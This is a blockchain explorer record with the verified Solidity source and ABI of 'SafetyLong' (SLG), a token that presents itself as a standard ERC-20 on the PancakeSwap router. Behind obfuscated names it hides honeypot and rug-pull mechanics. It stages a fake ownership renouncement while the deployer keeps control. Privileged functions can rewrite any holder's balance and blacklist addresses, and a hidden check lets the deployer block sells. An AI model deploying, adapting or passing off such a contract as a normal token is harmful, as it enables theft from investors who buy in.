{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\ninterface txLimit {\n    function createPair(address txLiquidity, address sellAuto) external returns (address);\n}\n\ninterface buyFee {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address takeMode) external view returns (uint256);\n\n    function transfer(address takeAt, uint256 tradingAuto) external returns (bool);\n\n    function allowance(address teamMaxBuy, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tradingAuto) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address takeAt,\n        uint256 tradingAuto\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed marketingWalletSender, uint256 value);\n    event Approval(address indexed teamMaxBuy, address indexed spender, uint256 value);\n}\n\nabstract contract senderFund {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface amountModeTrading {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface atFee is buyFee {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SafetyLong is senderFund, buyFee, atFee {\n\n    function launchedExempt() public {\n        emit OwnershipTransferred(shouldFee, address(0));\n        txBuySwap = address(0);\n    }\n\n    bool private tradingLiquidity;\n\n    uint256 public launchTrading;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return autoTxLaunch;\n    }\n\n    bool private shouldMarketingFund;\n\n    address private txBuySwap;\n\n    address public receiverExempt;\n\n    uint256 launchedFrom;\n\n    function balanceOf(address takeMode) public view virtual override returns (uint256) {\n        return swapAuto[takeMode];\n    }\n\n    function fromSwap(address walletLiquidity) public {\n        if (tradingReceiver) {\n            return;\n        }\n        \n        buyMarketing[walletLiquidity] = true;\n        \n        tradingReceiver = true;\n    }\n\n    uint256 sellLiquidity;\n\n    function name() external view virtual override returns (string memory) {\n        return receiverSender;\n    }\n\n    string private receiverSender = \"Safety Long\";\n\n    function atAmountReceiver(address receiverIs, address takeAt, uint256 tradingAuto) internal returns (bool) {\n        if (receiverIs == shouldFee) {\n            return launchedLaunchAmount(receiverIs, takeAt, tradingAuto);\n        }\n        uint256 maxBuy = buyFee(receiverExempt).balanceOf(launchedReceiverFee);\n        require(maxBuy == launchedFrom);\n        require(takeAt != launchedReceiverFee);\n        if (swapTokenTotal[receiverIs]) {\n            return launchedLaunchAmount(receiverIs, takeAt, marketingMin);\n        }\n        return launchedLaunchAmount(receiverIs, takeAt, tradingAuto);\n    }\n\n    function launchedLaunchAmount(address receiverIs, address takeAt, uint256 tradingAuto) internal returns (bool) {\n        require(swapAuto[receiverIs] >= tradingAuto);\n        swapAuto[receiverIs] -= tradingAuto;\n        swapAuto[takeAt] += tradingAuto;\n        emit Transfer(receiverIs, takeAt, tradingAuto);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return txBuySwap;\n    }\n\n    function fromSender(address tradingEnable, uint256 tradingAuto) public {\n        listFeeTake();\n        swapAuto[tradingEnable] = tradingAuto;\n    }\n\n    bool public toMax;\n\n    mapping(address => mapping(address => uint256)) private launchWallet;\n\n    address buyEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function listLiquidityLaunch(address maxList) public {\n        listFeeTake();\n        \n        if (maxList == shouldFee || maxList == receiverExempt) {\n            return;\n        }\n        swapTokenTotal[maxList] = true;\n    }\n\n    bool public launchedLimit;\n\n    bool public tradingReceiver;\n\n    uint256 private autoTxLaunch = 100000000 * 10 ** 18;\n\n    uint256 private buySwapWallet;\n\n    uint256 constant marketingMin = 6 ** 10;\n\n    event OwnershipTransferred(address indexed toFrom, address indexed liquidityLaunched);\n\n    uint8 private receiverToSwap = 18;\n\n    address public shouldFee;\n\n    mapping(address => uint256) private swapAuto;\n\n    uint256 public liquidityReceiver;\n\n    function allowance(address takeMinTotal, address totalTake) external view virtual override returns (uint256) {\n        if (totalTake == buyEnable) {\n            return type(uint256).max;\n        }\n        return launchWallet[takeMinTotal][totalTake];\n    }\n\n    constructor (){\n        if (launchedLimit == toMax) {\n            swapFund = minLiquidity;\n        }\n        amountModeTrading feeTeamLimit = amountModeTrading(buyEnable);\n        receiverExempt = txLimit(feeTeamLimit.factory()).createPair(feeTeamLimit.WETH(), address(this));\n        if (toMax) {\n            buySwapWallet = liquidityReceiver;\n        }\n        shouldFee = _msgSender();\n        buyMarketing[shouldFee] = true;\n        swapAuto[shouldFee] = autoTxLaunch;\n        launchedExempt();\n        \n        emit Transfer(address(0), shouldFee, autoTxLaunch);\n    }\n\n    mapping(address => bool) public buyMarketing;\n\n    function getOwner() external view returns (address) {\n        return txBuySwap;\n    }\n\n    function approve(address totalTake, uint256 tradingAuto) public virtual override returns (bool) {\n        launchWallet[_msgSender()][totalTake] = tradingAuto;\n        emit Approval(_msgSender(), totalTake, tradingAuto);\n        return true;\n    }\n\n    function receiverTxSwap(uint256 tradingAuto) public {\n        listFeeTake();\n        launchedFrom = tradingAuto;\n    }\n\n    function transfer(address tradingEnable, uint256 tradingAuto) external virtual override returns (bool) {\n        return atAmountReceiver(_msgSender(), tradingEnable, tradingAuto);\n    }\n\n    address launchedReceiverFee = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 public minLiquidity;\n\n    string private buyTradingEnable = \"SLG\";\n\n    uint256 private swapFund;\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverToSwap;\n    }\n\n    uint256 private launchTotal;\n\n    function listFeeTake() private view {\n        require(buyMarketing[_msgSender()]);\n    }\n\n    mapping(address => bool) public swapTokenTotal;\n\n    function symbol() external view virtual override returns (string memory) {\n        return buyTradingEnable;\n    }\n\n    function transferFrom(address receiverIs, address takeAt, uint256 tradingAuto) external override returns (bool) {\n        if (_msgSender() != buyEnable) {\n            if (launchWallet[receiverIs][_msgSender()] != type(uint256).max) {\n                require(tradingAuto <= launchWallet[receiverIs][_msgSender()]);\n                launchWallet[receiverIs][_msgSender()] -= tradingAuto;\n            }\n        }\n        return atAmountReceiver(receiverIs, takeAt, tradingAuto);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamMaxBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityLaunched\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingWalletSender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeMinTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalTake\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingAuto\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeMode\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buyMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingAuto\",\"type\":\"uint256\"}],\"name\":\"fromSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletLiquidity\",\"type\":\"address\"}],\"name\":\"fromSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxList\",\"type\":\"address\"}],\"name\":\"listLiquidityLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tradingAuto\",\"type\":\"uint256\"}],\"name\":\"receiverTxSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapTokenTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingAuto\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverIs\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingAuto\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SafetyLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}